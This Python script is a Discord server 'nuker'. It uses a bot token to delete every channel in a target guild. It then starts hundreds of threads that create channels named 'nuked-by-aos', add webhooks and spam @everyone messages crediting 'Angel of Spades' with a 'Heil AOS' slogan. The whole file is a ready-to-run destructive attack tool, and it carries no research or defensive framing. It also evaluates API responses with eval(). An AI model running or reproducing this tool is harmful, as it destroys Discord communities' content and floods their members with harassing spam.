import aiohttp
import asyncio
import requests
import json
import threading

null = None
false = False
true = True

discord_api_version = 9
discord_api_base_url = f"https://discord.com/api/v{discord_api_version}"

token = "" #Bot token
guild_id = "" #Guild to nuke

bot_token = "Bot " + token
headers = {"Authorization": bot_token , 'Content-type': 'application/json'}



async def delete_channel(session, url):
	async with session.delete(url) as resp:
		response = await resp.json()
		return response

def spam_channels():
	headers = {"Authorization": bot_token , 'Content-type': 'application/json'}
	payload = {"type":0,"name":"nuked-by-aos","permission_overwrites":[]}
	r = requests.post(f"{discord_api_base_url}/guilds/{guild_id}/channels?name='nuked-by-aos'", headers=headers , data = json.dumps(payload))
	new_channel_info = eval(r.text)
	new_channel_id = new_channel_info["id"]
	print("Created a channel")

	payload = {"name":"AOS"}
	r = requests.post(f"{discord_api_base_url}/channels/{new_channel_id}/webhooks", headers=headers , data = json.dumps(payload))
	new_webhook_info = eval(r.text)
	new_webhook_id = new_webhook_info["id"]
	new_webhook_token = new_webhook_info["token"]
	new_webhook_url = f"https://discord.com/api/webhooks/{new_webhook_id}/{new_webhook_token}"

	for message_number in range(30):
		data = {"content" : "@everyone you got nuked by Angel of Spades | Heil AOS |  https://www.youtube.com/channel/UCCDXW2YCAJbRepHU6HJY1yA | Get rekt by nutdestroyer , goc and xyzn"}
		r = requests.post(new_webhook_url, json = data)

def spam_channels_weaker():
	headers = {"Authorization": bot_token , 'Content-type': 'application/json'}
	payload = {"type":0,"name":"nuked-by-aos","permission_overwrites":[]}
	r = requests.post(f"{discord_api_base_url}/guilds/{guild_id}/channels?name='nuked-by-aos'", headers=headers , data = json.dumps(payload))
	new_channel_info = eval(r.text)
	new_channel_id = new_channel_info["id"]
	print("Created a channel")

async def nuke(guild_channels):

	async with aiohttp.ClientSession(headers=headers) as session:

		tasks = []
		for channel in guild_channels:
			channel_id = channel["id"]
			url = f"{discord_api_base_url}/channels/{channel_id}"
			tasks.append(asyncio.ensure_future(delete_channel(session, url)))
		
		responses = await asyncio.gather(*tasks)
		for response in responses:
			name = response["name"]
			id = response["id"]
			print(f"Deleted {name} | Id --> {id}")
			
		thread_list = []
		for x in range(50):
			thread = threading.Thread(target=spam_channels,)
			thread_list.append(thread)
			thread.start()
		for x in range(300):
			thread = threading.Thread(target=spam_channels_weaker,)
			thread_list.append(thread)
			thread.start()

		for thread in thread_list:
			thread.join()

r = requests.get(f"{discord_api_base_url}/guilds/{guild_id}/channels", headers=headers)
guild_channels = eval(r.text)
asyncio.run(nuke(guild_channels))